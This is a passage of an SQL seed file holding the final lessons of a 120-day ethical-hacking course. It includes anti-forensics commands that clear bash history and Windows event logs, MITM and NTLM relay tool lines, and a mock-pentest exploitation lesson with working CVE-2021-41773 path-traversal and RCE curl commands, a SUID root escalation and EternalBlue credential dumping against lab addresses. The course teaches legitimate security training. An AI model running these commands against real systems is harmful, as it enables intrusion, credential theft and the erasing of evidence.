- Use HTTPS C2 (blends with legitimate traffic)
- Avoid cmd.exe (use PowerShell or C# runner instead)
- Timestomp files: modify timestamps to match surrounding files
- Clear Windows Event Log (risky — may alert)
- Use named pipe C2 (Cobalt Strike: bind_pipe payloads)

**Anti-Forensics:**
```bash
# Linux: clear bash history
history -c && echo > ~/.bash_history
unset HISTFILE

# Shred files securely
shred -u -z /tmp/malware

# Windows: clear event logs
wevtutil cl System
wevtutil cl Security
```

**OPSEC Failures to Avoid:**
- Don''t use your real IP — always go through VPNs/proxies
- Don''t reuse C2 infrastructure across engagements
- Don''t leave tools on target systems
- Don''t generate excessive logs (slow, targeted scans)',
'https://tryhackme.com/room/advancedstaticreverseengineering', 'TryHackMe', 50),

(95, 5, 'Advanced Network Attacks', 'MITM attacks: ARP poisoning (arpspoof -i eth0 -t victim gateway), Bettercap (net.probe on, arp.spoof on, net.sniff on). DNS spoofing via ARP MITM: Responder for NBT-NS/LLMNR poisoning — captures NTLMv2 hashes from Windows authentication broadcasts. Relay attacks: ntlmrelayx.py -t smb://target -smb2support → relay captured NTLM auth. SMB Signing disabled = relay possible. IPv6 MITM: mitm6 (DHCPv6 + DNS) + ntlmrelayx → credential relay. 802.1X bypass: MAB (MAC Authentication Bypass) on misconfigured port security.', 'https://tryhackme.com/room/mitm', 'TryHackMe', 50),
(96, 5, 'Custom Exploit Development', 'Exploit development beyond template-based: analyze binary with GDB/pwndbg, find vulnerability manually, develop reliable exploit. Stack canaries: defeat with format string leak or brute force (fork). ASLR: defeat with info leak, ret2plt, or brute force (32-bit). NX/DEP: use Return-Oriented Programming (ROP) — chain existing code gadgets. pwntools (Python): process(), remote(), ELF(), ROP() — full exploit development framework. ROPgadget: find gadgets in binary. ropper: alternative gadget finder. Practice: pwn.college, picoCTF binary exploitation category.', 'https://picoctf.org', 'PicoCTF', 50),
(97, 5, 'Post-Exploitation Automation', 'Automation makes post-exploitation efficient and repeatable. Metasploit post modules: run post/multi/recon/local_exploit_suggester, run post/linux/gather/enum_system. Meterpreter scripts: persistence, hashdump, credential dump. PowerShell Empire: post-exploitation framework with modules for every task. CrackMapExec modules: bloodhound collection, lsassy, mimikatz, procdump. Custom Python scripts: paramiko for SSH automation, impacket for SMB/Kerberos. Document everything: commands run, files accessed, credentials found — essential for the report.', 'https://tryhackme.com/room/postexploit', 'TryHackMe', 50),
(98, 5, 'Physical Security and Hardware Hacking', 'Physical access bypasses all software controls. Lock picking: single pin picking, raking, bypass tools. RFID cloning: Proxmark3 to read/clone HID/EM4100 cards. BadUSB: Rubber Ducky, Flipper Zero — keyboard HID injection on plug-in. Evil maid attack: access unattended computer (boot from USB, extract BitLocker key from TPM, install keylogger). Network implant: Raspberry Pi with reverse shell and VPN, hidden in server room. BIOS/UEFI attacks: disable Secure Boot, install persistent firmware implant. Countermeasures: BIOS password, chassis intrusion detection, cable locks, visitor escort policies.', 'https://tryhackme.com/room/physicalsecurity', 'TryHackMe', 50),
(99, 5, 'Red Team Operations Planning', 'Red team operations simulate real adversaries (APTs). Phases: Planning (objectives, scope, timeline, rules of engagement) → Reconnaissance → Initial Compromise → Establish Foothold → Escalate Privileges → Internal Recon → Move Laterally → Maintain Presence → Complete Mission → Report. C2 infrastructure: domain fronting, redirectors (Apache mod_rewrite), CDN-based C2, HTTPS certificates on each domain. OPSEC: clean C2 profiles, traffic blending, minimal footprint. Threat intelligence: emulate specific threat actor TTPs (MITRE ATT&CK). Deliverable: detailed TTP mapping, attack narrative, video proof.', 'https://tryhackme.com/room/redteamfundamentals', 'TryHackMe', 50),
(100, 5, 'Phase 5 Review — Advanced Mastery', 'Phase 5 Complete: Advanced Techniques Mastery. You have covered: Active Directory attacks (Kerberoasting, DCSync, Pass-the-Hash, BloodHound), lateral movement (PtH, PtT, WMI, WinRM), credential dumping (LSASS, SAM, NTDS.dit, Mimikatz), pivoting (SSH tunnels, chisel, Ligolo), cloud exploitation (AWS SSRF, IAM escalation), container escapes, and red team OPSEC. Capstone: Complete TryHackMe "Wreath" network — a multi-machine lab requiring pivoting through three hosts. Phase 6 preview: Real-world practice — CTF competitions, bug bounty reports, full mock pentests.', 'https://tryhackme.com/room/wreath', 'TryHackMe', 75),

-- Phase 6: Real-World Practice (Days 101-120)
(101, 6, 'Professional Pentest Report Writing', 'A professional pentest report is your product. Structure: Cover Page (client name, date, classification), Table of Contents, Executive Summary (1-2 pages, business language, no technical jargon, overall risk rating, top 3 findings, strategic recommendations), Scope and Methodology, Findings (each: title, severity, CVSS score, description, impact, proof-of-concept steps, remediation), Appendices (raw tool output, full scan results, methodology references). CVSS 3.1 calculator: first.org/cvss. Severity: Critical (9-10), High (7-8.9), Medium (4-6.9), Low (0.1-3.9). Use templates from HackTricks and TCM Security.', 'https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report', 'TryHackMe', 50),
(102, 6, 'CVSS Scoring and Risk Classification', 'CVSS v3.1 Base Metrics: Attack Vector (Network=0.85, Adjacent=0.62, Local=0.55, Physical=0.2), Attack Complexity (Low=0.77, High=0.44), Privileges Required (None=0.85, Low=0.62, High=0.27), User Interaction (None=0.85, Required=0.62), Scope (Unchanged/Changed), Confidentiality/Integrity/Availability Impact (None/Low/High). Calculate at: first.org/cvss/calculator/3.1. Temporal metrics adjust for exploit maturity and remediation. Environmental metrics adjust for your specific deployment. Always document methodology for score — clients will question it. Contextual risk may differ from CVSS score.', 'https://tryhackme.com/room/cvssscoring', 'TryHackMe', 50),
(103, 6, 'Bug Bounty — Finding Your First Vulnerability', 'Start with HackerOne or Bugcrowd. Pick a program: new programs = less competition, programs with large scope = more targets. Methodology: map all subdomains, find all endpoints, test each for OWASP Top 10. Low-hanging fruit: check for CORS misconfiguration on every API endpoint, test for open redirects in redirect parameters, check subdomain takeover, look for exposed .git directories, test default credentials on admin panels. Write good reports: clear title, severity with justification, step-by-step reproduction, impact statement, suggested remediation. Communicate professionally even if report is rejected.', 'https://hackerone.com/hacktivity', 'HackTheBox', 50),
(104, 6, 'Writing Effective Bug Reports', 'A well-written report gets triaged faster and paid more. Template: Title (concise, e.g., "Reflected XSS on /search endpoint via q parameter"), Severity (Critical/High/Medium/Low with justification), Description (what the bug is, why it''s a vulnerability), Steps to Reproduce (numbered, copy-pasteable, include exact URLs and payloads), Proof of Concept (screenshots, video, request/response), Impact (what an attacker can achieve — be specific and realistic), Suggested Fix (optional but appreciated). Avoid: vague descriptions, missing PoC, inflated severity, submitting without testing. Tools: Markdown, ScreenToGif for animated PoC.', 'https://hackerone.com/security-policy', 'HackTheBox', 50),
(105, 6, 'CTF Strategy and Approach', 'CTF (Capture The Flag) competitions test skill across categories. Web: SQLi, XSS, SSRF, deserialization, LFI. Crypto: classical ciphers, RSA attacks, padding oracles, hash length extension. Forensics: file analysis, steganography, network packet analysis (Wireshark), memory forensics (Volatility). Reverse Engineering: disassembly (Ghidra, IDA Free), decompilation, patch binary. Pwn (Binary Exploitation): buffer overflow, ROP, heap exploitation. Misc: OSINT challenges, encoding/decoding. Strategy: read all challenges first, start with easiest per category, work with team on communication, document everything even failed attempts, Google is allowed!', 'https://picoctf.org', 'PicoCTF', 50),
(106, 6, 'CTF — Web Challenges', 'Web CTF challenges test creative application of web vulnerabilities. Common challenge types: find hidden page (robots.txt, source code comment, headers), bypass authentication (SQLi, JWT attack, cookie manipulation), extract data (SQLi, SSRF to localhost, LFI to read flags), XSS to steal admin cookie (set up listener, trigger stored XSS), template injection for flag in environment variable, prototype pollution to bypass access control, GraphQL introspection to find admin query. Tools: Burp Suite, curl, Python requests library, SQLMap for CTFs (--level=5 --risk=3 --batch). Always check page source, JS files, and network requests.', 'https://picoctf.org', 'PicoCTF', 50),
(107, 6, 'CTF — Cryptography Challenges', 'Crypto challenges range from classical to modern. Classical: Caesar/ROT13/Vigenere (decode with dcode.fr), Rail Fence, Bacon, Morse. Modern: RSA with small n (factor with factordb.com), RSA with e=3 (small plaintext, cube root), RSA common modulus attack, padding oracle (padbuster). Hash: identify type (hash-identifier), crack with CrackStation or hashcat. Encoding: base64, hex, base32, base58. Misc: XOR cipher (single byte key — frequency analysis; multi-byte — index of coincidence). CyberChef (gchq.github.io/CyberChef) — "magic" auto-decode feature. Python gmpy2 and PyCryptodome libraries for custom solutions.', 'https://picoctf.org', 'PicoCTF', 50),
(108, 6, 'CTF — Forensics and Steganography', 'Forensics covers file analysis and steganography. File analysis: file command (identify type), binwalk (embedded files), strings -a (text in binary), xxd (hex dump), foremost/photorec (file carving). Steganography: steghide extract (images), stegsolve (color channel manipulation), zsteg (PNG/BMP hidden data), exiftool (metadata), sonic visualizer (audio spectrogram — hidden messages in sound). Network: Wireshark (follow TCP stream, export HTTP objects, filter by protocol). Memory: Volatility (pslist, filescan, dumpfiles, hashdump, clipboard). PCAP: extract files (Wireshark: File→Export Objects), find credentials in cleartext protocols.', 'https://picoctf.org', 'PicoCTF', 50),
(109, 6, 'CTF — Binary Exploitation', 'Binary exploitation (pwn) challenges require understanding memory and CPU. Tools: pwndbg (GDB plugin), pwntools (Python framework), ROPgadget, checksec. Workflow: checksec binary (what protections?), run in GDB, find vulnerability, develop exploit. Common challenges: ret2win (overflow to call win function), ret2libc (no executable stack — return to libc system("/bin/sh")), ROP chain (chain gadgets to call functions). Format string: %x%x%x leaks stack, %n writes to address. Heap: UAF (use-after-free), double-free, heap overflow. Practice: pwn.college (free, excellent progression), exploit.education VMs.', 'https://picoctf.org', 'PicoCTF', 50),
(110, 6, 'Participating in Live CTF Competitions', 'CTFtime.org lists upcoming competitions. Popular CTFs: picoCTF (beginner), CSAW CTF, Google CTF, DEF CON CTF (elite), HTB CTF seasons, NahamCon CTF. Team strategy: 4-8 members with different specializations, use Discord/Slack for communication, shared Google Doc for progress, dedicated challenge tracker. During competition: read all challenges first to allocate effort, solve fastest to gain momentum, never rabbit-hole on one challenge — move on after 30min stuck. After competition: read other teams'' writeups, understand how to solve what you missed. Write your own writeups — builds reputation and reinforces learning.', 'https://ctftime.org', 'TryHackMe', 50),
(111, 6, 'Mock Penetration Test — Day 1: Scoping', 'Begin a full simulated penetration test against a test environment. Day 1 — Scoping and kick-off. Define: client name (fictional — "AcmeCorp"), engagement type (black-box external), scope (10.10.10.0/24 + acmecorp.htb), timeline (5 days), rules of engagement (no DoS, testing hours 9am-5pm, emergency contact), objectives (test perimeter defenses, check for critical vulnerabilities). Create a pentest project folder: mkdir -p acme/{recon,scans,exploits,post,report}. Document scope in writing. The kick-off document protects you legally and sets expectations. Professional pentesters spend 20% of engagement time on proper documentation.', 'https://tryhackme.com/room/cyberpolicies', 'TryHackMe', 50),
(112, 6, 'Mock Pentest — Day 2: Reconnaissance', 'Day 2 of mock pentest — Reconnaissance phase. Execute full recon pipeline against acmecorp.htb scope. Run: whois, dig all record types, crt.sh subdomain discovery, Shodan search for IP range, Google dorks for exposed files and admin panels, theHarvester for email discovery. Document findings: 3 subdomains found (mail.acmecorp.htb, vpn.acmecorp.htb, dev.acmecorp.htb), tech stack identified (Apache 2.4.49, PHP 7.4, WordPress 5.8.1), email format first.last@acmecorp.htb, 2 employee names from LinkedIn. Shodan shows port 8080 open on secondary IP — potential Jenkins. Good recon = more attack surface = more findings.', 'https://tryhackme.com/room/activerecon', 'TryHackMe', 50),
(113, 6, 'Mock Pentest — Day 3: Scanning and Enumeration', 'Day 3 — Scanning phase. Full Nmap scan: nmap -p- -T4 -sV -sC -oA scans/full 10.10.10.0/24. Findings: 10.10.10.5 (Apache 2.4.49 HTTP, SSH 7.9, port 8080 HTTP), 10.10.10.10 (Windows — SMB, RDP, WinRM), 10.10.10.15 (FTP 3.0.3, SSH). Per-service enumeration: Apache 2.4.49 → searchsploit apache 2.4.49 → CVE-2021-41773 (path traversal/RCE!). SMB enumeration: enum4linux shows SMBv1 enabled on Windows host, EternalBlue possible. FTP: anonymous login enabled, interesting files visible. Jenkins at :8080 — default credentials? admin/admin works! Jenkins → script console → RCE.', 'https://tryhackme.com/room/furthernmap', 'TryHackMe', 50),
(114, 6, 'Mock Pentest — Day 4: Exploitation', 'Day 4 — Exploitation. Apache CVE-2021-41773: curl --path-as-is http://10.10.10.5/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd → confirms LFI → enable mod_cgi → RCE via curl -d "echo Content-Type: text/plain; echo; id" http://10.10.10.5/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh. Get reverse shell. Linux box: run linpeas → find SUID /usr/bin/find → find . -exec /bin/bash \; → root! Windows box: metasploit ms17_010_eternalblue → SYSTEM shell → hashdump → crack Administrator hash. Jenkins: Groovy console → Runtime.exec reverse shell. Three compromised hosts. Document: exact commands, timestamps, screenshots, data accessed.', 'https://tryhackme.com/room/blue', 'TryHackMe', 75),
(115, 6, 'Mock Pentest — Day 5: Reporting', 'Day 5 — Report writing. Structure your acmecorp-pentest-report.pdf. Executive Summary: "During a 5-day black-box assessment, three critical vulnerabilities were identified allowing full compromise of all in-scope systems. The most severe finding allowed unauthenticated remote code execution as root." Findings documented: F01 - Apache Path Traversal RCE (CVSS 9.8, Critical), F02 - SMBv1/EternalBlue (CVSS 9.8, Critical), F03 - Jenkins Default Credentials (CVSS 8.8, High). Each finding: description, impact, reproduction steps, screenshot evidence, remediation. Remediation timeline: critical within 24 hours. This report structure is industry standard.', 'https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report', 'TryHackMe', 75),
(116, 6, 'CompTIA Security+ Exam Prep', 'Security+ (SY0-701) is the most recognized entry-level security certification. Domains: General Security Concepts (12%), Threats/Vulnerabilities/Mitigations (22%), Security Architecture (18%), Security Operations (28%), Security Program Management (20%). Key topics: CIA triad, AAA model, defense in depth, zero trust architecture, PKI and certificate management, network security (firewall types, IDS/IPS, SIEM), identity (MFA, SSO, SAML), incident response (PICERL: Prepare, Identify, Contain, Eradicate, Recover, Lessons Learned), risk management (risk = likelihood × impact), compliance frameworks (SOC2, ISO 27001, NIST CSF, PCI-DSS, HIPAA). Study: Professor Messer (free YouTube), Jason Dion practice exams.', 'https://youtube.com/@professormesser', 'TryHackMe', 50),
(117, 6, 'CEH and OSCP Exam Overview', 'CEH (Certified Ethical Hacker) by EC-Council: multiple choice exam, covers hacking methodology broadly. Exam: 125 questions, 4 hours. Recognized but considered less rigorous than OSCP. OSCP (Offensive Security Certified Professional): industry gold standard. 24-hour practical exam — compromise 3 standalone boxes + Active Directory set. Requires: PEN-200 (PWK) course completion, or can challenge directly. Skills: Kali, Metasploit, manual exploitation, report writing. Preparation: complete all HackTheBox and TryHackMe machines in OSCP guide, 0xdf''s HTB writeups, TJNull''s OSCP list. PNPT (Practical Network Penetration Tester) by TCM Security: excellent practical alternative to CEH.', 'https://offensive-security.com/pwk-oscp', 'TryHackMe', 50),
(118, 6, 'Building Your Security Portfolio', 'A strong portfolio opens doors. GitHub: upload your tools, scripts, and automation. TryHackMe/HTB profile: show completion stats, room badges. Write CTF writeups: publish on Medium/GitHub Pages, submit to infosecwriteups.com. Personal website: list certifications, tools built, CVEs found, bug bounty findings. LinkedIn: complete profile, connect with security community, share writeups. Twitter/X: follow security researchers (LiveOverflow, nahamsec, TomNomNom, BugBountyHunter). Bug bounty Hall of Fame: public acknowledgment on company security pages. Conference talks: local BSides events — present your research. Reputation = opportunities.', 'https://tryhackme.com', 'TryHackMe', 50),
(119, 6, 'Security Career Pathways', 'Security career paths post-certification. Penetration Tester: external/internal network pentests, web app pentests. Entry: Junior PT ($60-80K), Senior PT ($90-130K), Principal ($130K+). Red Team Operator: simulated APT operations, C2, OPSEC-focused. Requires OSCP + 3-5 years experience. Bug Bounty Hunter: freelance, income varies wildly. Top hunters earn $500K+/year. Security Engineer: build defenses, configure tools, code security features. Combines dev + security. SOC Analyst: monitor alerts, investigate incidents. Entry point for many. Security Architect: design secure systems at enterprise scale. CISO: executive role, strategy and governance. Start with entry-level PT role or bug bounty while studying for OSCP.', 'https://tryhackme.com/paths', 'TryHackMe', 50),
(120, 6, 'HackPath Complete — You Are Job-Ready',
'## 🏆 HackPath Complete: 120 Days, Zero to Job-Ready

Congratulations. You have completed the full 120-day HackPath curriculum. You are now equipped for entry-level penetration testing roles and competitive bug bounty hunting.

**Complete Skills Acquired:**

✅ **Phase 1 — Foundations:** Networking (OSI, TCP/IP, DNS, subnetting), Linux mastery, web technologies, cryptography basics, lab setup

✅ **Phase 2 — Reconnaissance:** OSINT, Google dorking, Shodan, DNS recon, Nmap (all scan types + NSE), service enumeration, web discovery, cloud recon, bug bounty OSINT pipeline

✅ **Phase 3 — Exploitation:** Metasploit, shells (all languages), password attacks, SQLi (manual + SQLMap), XSS (all types), file upload bypass, command injection, path traversal, buffer overflows, Linux/Windows privilege escalation

✅ **Phase 4 — Web App Hacking:** OWASP Top 10, Burp Suite mastery, SSRF, XXE, SSTI, deserialization, JWT/OAuth attacks, API/GraphQL hacking, request smuggling, cache poisoning

✅ **Phase 5 — Advanced:** Active Directory (BloodHound, Kerberoasting, DCSync, Pass-the-Hash), lateral movement, credential dumping, pivoting, persistence, cloud exploitation, container escapes

✅ **Phase 6 — Real-World:** Professional report writing, CVSS scoring, bug bounty methodology, CTF strategy (web/crypto/forensics/pwn), full mock pentest (5 days), certification roadmap, career pathways

**Your Next Steps:**

1. **Certifications:** CompTIA Security+ → OSCP (or PNPT for budget option)
2. **Bug Bounty:** Start on HackerOne/Bugcrowd — pick 3 programs and hunt weekly
3. **HackTheBox:** Complete the OSCP preparation list (TJNull''s list)
4. **Portfolio:** GitHub with your tools, Medium with your writeups
5. **Community:** Join TCM Security Discord, Bug Bounty Forum, local security meetups

**You earned it. Welcome to the profession.**

`$ whoami`
`> ethical_hacker`',
'https://hackthebox.com', 'HackTheBox', 100)

on conflict (id) do nothing;
